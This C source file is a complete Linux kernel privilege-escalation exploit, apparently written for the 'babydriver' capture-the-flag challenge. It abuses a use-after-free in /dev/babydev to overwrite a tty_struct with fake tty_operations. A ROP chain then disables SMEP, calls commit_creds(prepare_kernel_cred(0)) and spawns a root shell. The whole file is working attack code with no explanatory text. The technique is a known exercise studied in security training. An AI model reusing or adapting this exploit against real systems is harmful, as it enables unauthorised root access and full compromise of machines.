#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/wait.h>
#include <sys/stat.h>

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__(
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );
    puts("[+] status has been saved.");
}


void get_shell()
{
    system("/bin/sh");
}


size_t prepare_kernel_cred_addr = 0xffffffff810a1810, commit_creds_addr = 0xffffffff810a1420;
void get_root()
{
    char* (*pkc)(int) = prepare_kernel_cred_addr;
    void (*cc)(char*) = commit_creds_addr;
    (*cc)((*pkc)(0));
}

void* fake_tty_operations[0x30];
int main()
{
    save_status();
    size_t ropchain[0x20] = {0};
    int i = 0;
    ropchain[i++] = 0xffffffff810d238d;         // pop rdi ; ret 0 
    ropchain[i++] = 0x6f0;
    ropchain[i++] = 0xffffffff81004d80;         // mov cr4, rdi ; pop rbp ; ret
    ropchain[i++] = 0;
    ropchain[i++] = (size_t)get_root;
    ropchain[i++] = 0xffffffff81063694;         // swqpgs ; pop rbp ; ret 
    ropchain[i++] = 0;
    ropchain[i++] = 0xffffffff814e35ef;         // iretq ; ret 
    ropchain[i++] = (size_t)get_shell;          // rip
    ropchain[i++] = user_cs;
    ropchain[i++] = user_rflags;
    ropchain[i++] = user_sp;
    ropchain[i++] = user_ss;

    fake_tty_operations[0] = 0xffffffff810635f5;    // pop rax; pop rbp; ret 
    fake_tty_operations[1] = ropchain;
    fake_tty_operations[3] = 0xFFFFFFFF8181BFC5;    // mov rsp, rax; dec ebx; ret 
    fake_tty_operations[7] = 0xFFFFFFFF8181BFC5;    // mov rsp, rax; dec ebx; ret 

    int fd1 = open("/dev/babydev", O_RDWR);
    int fd2 = open("/dev/babydev", O_RDWR);
    ioctl(fd1, 0x10001, 0x2e0);
    close(fd1);
    int fd_tty = open("/dev/ptmx", O_RDWR | O_NOCTTY);
    size_t fake_tty_struct[4] = {0};
    read(fd2, fake_tty_struct, 0x20);
    fake_tty_struct[3] = fake_tty_operations;
    write(fd2, fake_tty_struct, 0x20);
    char buf[8] = {0};
    write(fd_tty, buf, 8);
    return 0;
}
